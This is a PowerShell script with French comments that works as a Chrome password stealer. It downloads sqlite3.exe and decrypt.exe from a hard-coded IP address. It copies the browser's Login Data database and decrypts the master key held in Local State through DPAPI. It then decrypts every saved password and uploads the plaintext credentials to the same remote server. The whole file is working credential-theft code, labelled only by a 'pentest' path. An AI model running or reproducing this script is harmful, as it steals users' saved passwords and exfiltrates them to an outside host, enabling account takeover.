# ---------------------------
# === CONFIGURATION ===
# ---------------------------

Add-Type -AssemblyName System.Security

$server = "http://86.249.42.88/pentest"
$outdir = "$env:TEMP\pt"
New-Item -ItemType Directory -Force -Path $outdir | Out-Null

# ---------------------------
# === Téléchargement des outils ===
# ---------------------------

Invoke-WebRequest "$server/sqlite3.exe" -OutFile "$outdir\sqlite3.exe"
Invoke-WebRequest "$server/decrypt.exe" -OutFile "$outdir\decrypt.exe"

# ---------------------------
# === Extraction de la base Chrome ===
# ---------------------------

$LoginData = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
$TempLoginData = "$outdir\LoginData"
Copy-Item $LoginData $TempLoginData -Force

# ---------------------------
# === Dump de la base en CSV ===
# ---------------------------

& "$outdir\sqlite3.exe" $TempLoginData "SELECT origin_url, username_value, hex(password_value) FROM logins;" > "$outdir\credentials_raw.csv"
Write-Host "✅ Dump brut enregistré"

# ---------------------------
# === Extraction de la master_key ===
# ---------------------------

$LocalState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
$LocalStateContent = Get-Content $LocalState -Raw | ConvertFrom-Json
$encMasterKey = [Convert]::FromBase64String($LocalStateContent.os_crypt.encrypted_key)
$encMasterKey = $encMasterKey[5..($encMasterKey.Length - 1)]
$masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encMasterKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$masterKeyB64 = [Convert]::ToBase64String($masterKey)

Write-Host "✅ Master Key extraite"

# ---------------------------
# === Décryptage des mots de passe ===
# ---------------------------

$decrypt = "$outdir\decrypt.exe"
$decryptedResults = @()

$csvLines = Get-Content "$outdir\credentials_raw.csv" | Where-Object {$_ -ne ""}

foreach ($line in $csvLines) {
    $parts = $line -split '\|'
    if ($parts.Length -ge 3) {
        $url = $parts[0].Trim()
        $username = $parts[1].Trim()
        $encHex = $parts[2].Trim()
        if ($encHex -ne "") {
            $blobBytes = for ($i=0; $i -lt $encHex.Length; $i+=2) { [Convert]::ToByte($encHex.Substring($i,2),16) }
            $blobB64 = [Convert]::ToBase64String($blobBytes)
            $decryptedPass = & $decrypt "$masterKeyB64" "$blobB64"
            $decryptedResults += "$url`t$username`t$decryptedPass"
        }
    }
}

# ---------------------------
# === Sauvegarde locale + Upload ===
# ---------------------------

$credsFile = "$outdir\credentials_decrypted.txt"
$decryptedResults | Out-File $credsFile

Write-Host "✅ Fichier déchiffré généré"

# Upload vers Laravel
$wc = New-Object System.Net.WebClient
$wc.UploadFile("$server/upload", "POST", $credsFile)

Write-Host "✅ Credentials envoyés au serveur"

# ---------------------------
# === Nettoyage ===
# ---------------------------

Remove-Item $TempLoginData -Force
